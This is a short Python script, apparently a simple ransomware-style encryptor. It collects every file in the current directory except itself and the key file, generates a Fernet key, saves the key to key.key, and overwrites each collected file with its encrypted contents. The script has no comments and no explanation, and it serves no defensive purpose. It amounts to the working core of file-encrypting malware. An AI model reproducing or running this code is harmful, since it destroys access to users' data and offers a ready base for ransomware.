import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'main.py' or file == 'key.key':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open('key.key', 'wb') as key_file:
    key_file.write(key)

for file in files:
    with open(file, 'rb') as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as f:
        f.write(contents_encrypted)
